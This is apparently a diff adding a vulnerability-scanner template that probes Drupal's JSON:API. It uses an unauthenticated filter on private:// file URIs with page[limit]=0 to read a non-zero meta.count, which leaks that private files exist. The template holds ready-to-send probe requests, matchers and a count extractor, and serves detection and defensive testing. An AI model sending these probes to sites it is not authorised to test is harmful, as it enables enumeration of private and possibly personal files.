@@ -1,0 +1,56 @@
+id: drupal-jsonapi-private-file-count-oracle
+
+info:
+  name: Drupal JSON:API meta.count Private File Enumeration Oracle
+  author: WakedXY
+  severity: medium
+  description: |
+    The Drupal JSON:API endpoint enforces access control on returned entities
+    but not on the meta.count aggregate. An unauthenticated user can filter on
+    uri.value (STARTS_WITH private://) with page[limit]=0 and read a non-zero
+    meta.count while the data array stays empty — confirming the existence and
+    enumerability of private files through a metadata side-channel.
+    Severity may be higher when filenames contain PII.
+  reference:
+    - https://github.com/wakedxy/CVEForge/tree/main/DRUPAL-JSONAPI-ORACLE
+    - https://www.drupal.org/sa-core-2020-002
+    - https://www.drupal.org/node/3021545
+  metadata:
+    verified: false            # heuristic — confirm manually, false positives possible
+  tags: drupal,jsonapi,exposure,enum,idor
+
+http:
+  - method: GET
+    path:
+      # try with and without a language prefix (adjust /fr/ to the target)
+      - "{{BaseURL}}/jsonapi/file/file?filter[uri.value][operator]=STARTS_WITH&filter[uri.value][value]=private%3A%2F%2F&page[limit]=0"
+      - "{{BaseURL}}/fr/jsonapi/file/file?filter[uri.value][operator]=STARTS_WITH&filter[uri.value][value]=private%3A%2F%2F&page[limit]=0"
+      - "{{BaseURL}}/en/jsonapi/file/file?filter[uri.value][operator]=STARTS_WITH&filter[uri.value][value]=private%3A%2F%2F&page[limit]=0"
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "application/vnd.api+json"
+
+      - type: word
+        part: body
+        words:
+          - '"data":[]'
+          - '"data": []'
+        condition: or
+
+      # non-zero count under the private:// filter = files counted but not returned
+      - type: regex
+        part: body
+        regex:
+          - '"count"\s*:\s*[1-9][0-9]*'
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"count"\s*:\s*([0-9]+)'
